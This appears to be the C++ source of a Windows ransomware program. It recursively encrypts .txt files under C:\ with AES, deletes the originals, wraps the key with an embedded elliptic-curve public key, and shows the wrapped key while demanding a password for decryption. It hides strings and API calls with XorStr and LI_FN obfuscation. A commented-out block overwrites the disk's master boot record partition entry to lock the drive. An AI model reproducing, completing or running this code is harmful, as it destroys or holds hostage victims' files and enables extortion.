#include "stdafx.h"

#undef max

const static std::string pub_key_string(XorStr("30819B301006072A8648CE3D020106052B810400230381860004009F85473227A878B19375968A28F82FDEC53FD18108359A853F0F455247D76D190C06748B169CB79F7813503102CB1E7B0819D7A125702D3ECE1F71D49C89D2CD8B003EF074E9DEB8977315F041D8773783D223F49F3D216613CDEF23AA02765C5DDEC4E3042A4FA7482224735AF7F77B6BE62CBDE79A7C9430F44F5AF4B0C005D1AF3D"));

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
	_CrtSetReportMode(_CRT_WARN, _CRTDBG_MODE_DEBUG);

	SetConsoleOutputCP(65001);
	CONSOLE_FONT_INFOEX Info = { 0 };
	Info.cbSize = sizeof(Info);
	Info.dwFontSize.Y = 16;
	Info.FontWeight = FW_NORMAL;
	wcscpy_s(Info.FaceName, XorStrW(L"Consolas"));
	SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), NULL, &Info);

	spdlog::set_level(spdlog::level::err);

	/*auto DiskHandle = LI_FN(CreateFileW)(XorStrW(L"\\\\.\\PhysicalDrive0"), FILE_WRITE_DATA | FILE_READ_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (DiskHandle != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER Pos{ 0 };
		DWORD Bytes = 0;
		BYTE Sector[0x200]{ 0x00 };
		LI_FN(SetFilePointer)(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
		if (LI_FN(ReadFile)(DiskHandle, Sector, sizeof(Sector), &Bytes, nullptr))
		{
			Sector[0x1BE] = 0x80;
			Sector[0x1BF] = 0xFE;
			Sector[0x1C0] = 0xFF;
			Sector[0x1C1] = 0xFF;
			Sector[0x1C2] = 0x0F;
			Sector[0x1C3] = 0xFE;
			Sector[0x1C4] = 0xFF;
			Sector[0x1C5] = 0xFF;
			Sector[0x1C6] = 0x00;
			Sector[0x1C7] = 0x00;
			Sector[0x1C8] = 0x00;
			Sector[0x1C9] = 0x00;
			Sector[0x1CA] = 0x01;
			Sector[0x1CB] = 0x00;
			Sector[0x1CC] = 0x00;
			Sector[0x1CD] = 0x00;

			LI_FN(SetFilePointer)(DiskHandle, Pos.LowPart, &Pos.HighPart, FILE_BEGIN);
			if (LI_FN(WriteFile)(DiskHandle, Sector, sizeof(Sector), &Bytes, nullptr))
			{
				spdlog::info("Locked!");
			}
			else
				spdlog::error("WriteFile error,GetLastError():{}", GetLastError());
		}
		else
			spdlog::error("ReadFile error,GetLastError():{}", GetLastError());

		LI_FN(CloseHandle)(DiskHandle);
	}
	else
		spdlog::error("CreateFile error,GetLastError():{}", GetLastError());*/

		/*uint64_t count = 0;
		auto start = std::chrono::steady_clock::now();

		std::unordered_multimap<std::filesystem::path, std::filesystem::path> type_map{};
		std::filesystem::recursive_directory_iterator end_iter;
		for (std::filesystem::recursive_directory_iterator iter(XorStrW(L"G:\\Test\\"), std::filesystem::directory_options::skip_permission_denied); iter != end_iter; iter++)
		{
			type_map.emplace(std::move(iter->path().extension()), iter->path());
			++count;
		}

		auto end = std::chrono::steady_clock::now();
		auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
		auto time = (double)duration.count() * std::chrono::microseconds::period::num / std::chrono::microseconds::period::den;
		spdlog::debug("{} seconds,{} files,{} files per second", time, count, (uint64_t)(count / time));*/

	std::tuple<std::vector<std::wstring> /*locked_list*/, std::array<byte, CryptoPP::AES::BLOCKSIZE> /*iv*/, std::string /*cipher_encoded*/> saved_context;
	auto& locked_list = std::get<0>(saved_context);
	static auto& cipher_encoded = std::get<2>(saved_context);
	auto& iv = std::get<1>(saved_context);

	if (!std::filesystem::exists(XorStr("saved_context")))
	{
		std::unordered_multimap<std::filesystem::path, std::filesystem::path> type_map{};
		std::filesystem::recursive_directory_iterator end_iter;
		for (std::filesystem::recursive_directory_iterator iter(XorStrW(L"C:\\"), std::filesystem::directory_options::skip_permission_denied); iter != end_iter; iter++)
			type_map.emplace(std::move(iter->path().extension()), iter->path());

		CryptoPP::AutoSeededRandomPool Rnd;

		Rnd.GenerateBlock(iv.data(), CryptoPP::AES::BLOCKSIZE);

		{
			CryptoPP::SecByteBlock aes_key(0x00, CryptoPP::AES::MAX_KEYLENGTH);
			CryptoPP::StringSource pub_key(pub_key_string, true, new CryptoPP::HexDecoder);
			CryptoPP::ECIES<CryptoPP::ECP>::Encryptor ecc_encryptor(pub_key);
			CryptoPP::SecByteBlock cipher(ecc_encryptor.CiphertextLength(aes_key.size()));

			Rnd.GenerateBlock(aes_key, aes_key.size());
			ecc_encryptor.Encrypt(Rnd, aes_key, aes_key.size(), cipher);
			CryptoPP::StringSource(cipher, cipher.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(cipher_encoded)));
			CryptoPP::OFB_Mode<CryptoPP::AES>::Encryption aes_encryptor(aes_key, aes_key.size(), iv.data());

			auto range = type_map.equal_range(XorStrW(L".txt"));
			for (auto iter = range.first; iter != range.second; ++iter)
			{
				const auto& plain_file = iter->second.wstring();
				const auto& cipher_file = plain_file + L".lck";

				spdlog::debug(L"encrypting {}", plain_file);
				try
				{
					CryptoPP::FileSource(plain_file.c_str(), true, new CryptoPP::StreamTransformationFilter(aes_encryptor, new CryptoPP::FileSink(cipher_file.c_str())));

					if (!std::filesystem::remove(iter->second)) spdlog::error(L"remove {}", plain_file);
				}
				catch (const std::exception&)
				{
					spdlog::error(L"error {}", plain_file);

					continue;
				}

				locked_list.push_back(cipher_file);
			}
		}

		std::ofstream saved_context_file(XorStr("saved_context"));
		if (saved_context_file.is_open())
		{
			boost::archive::text_oarchive locked_list_file_archive(saved_context_file);
			locked_list_file_archive << saved_context;
		}
		else spdlog::error("saved_context_file error");
	}

	std::fstream saved_context_file(XorStr("saved_context"), std::ios_base::in | std::ios_base::out);
	if (saved_context_file.is_open())
	{
		boost::archive::text_iarchive locked_list_file_archive(saved_context_file);
		locked_list_file_archive >> saved_context;

		std::string plain;
		std::string plain_encoded;

		SetConsoleCtrlHandler([](DWORD CtrlType)->BOOL {
			clipboardxx::clipboard clipboard;
			if (CtrlType == CTRL_C_EVENT) clipboard << cipher_encoded;

			return TRUE;
			}, TRUE);

		fmt::print("***************CLIPHER FIRST****************\n");
		fmt::print("{}\n", cipher_encoded);
		fmt::print("********************************************\n");

		while (true)
		{
			std::ofstream cipher_encoded_file(XorStr("cipher_encoded.txt"), std::ios_base::trunc);
			if (cipher_encoded_file.is_open())
			{
				cipher_encoded_file << cipher_encoded;

				cipher_encoded_file.close();
			}
			else spdlog::error("cipher_encoded_file error");

			fmt::print("input the password(input \'file\' to read password from \'cipher_encoded.txt\'):");
			std::cin >> plain_encoded;

			try
			{
				if (plain_encoded == "file") CryptoPP::FileSource(saved_context_file, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(plain)));
				else CryptoPP::StringSource(plain_encoded, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(plain)));
				CryptoPP::OFB_Mode<CryptoPP::AES>::Decryption aes_decryptor((byte*)plain.c_str(), plain.size(), iv.data());

				for (const auto& item : locked_list)
				{
					const auto& cipher_file = item;
					auto plain_file = cipher_file;
					plain_file.erase(plain_file.end() - 4, plain_file.end());

					try
					{
						spdlog::debug(L"decrypting {}", plain_file);
						CryptoPP::FileSource(cipher_file.c_str(), true, new CryptoPP::StreamTransformationFilter(aes_decryptor, new CryptoPP::FileSink(plain_file.c_str())));

						if (!std::filesystem::remove(cipher_file)) spdlog::error(L"remove {}", cipher_file);
					}
					catch (const std::exception&)
					{
						spdlog::error(L"error {}", cipher_file);

						continue;
					}
				}

				saved_context_file.close();
				if (!std::filesystem::remove(XorStr("saved_context"))) spdlog::error(L"remove saved_context");
				if (!std::filesystem::remove(XorStr("cipher_encoded"))) spdlog::error(L"remove cipher_encoded");
				fmt::print("decrypt successfully\n");
				break;
			}
			catch (const CryptoPP::Exception&)
			{
				spdlog::error("wrong password\n\n");
			}
		}
	}
	else spdlog::error("saved_context_file error");

	_getch();

	return GetLastError();
}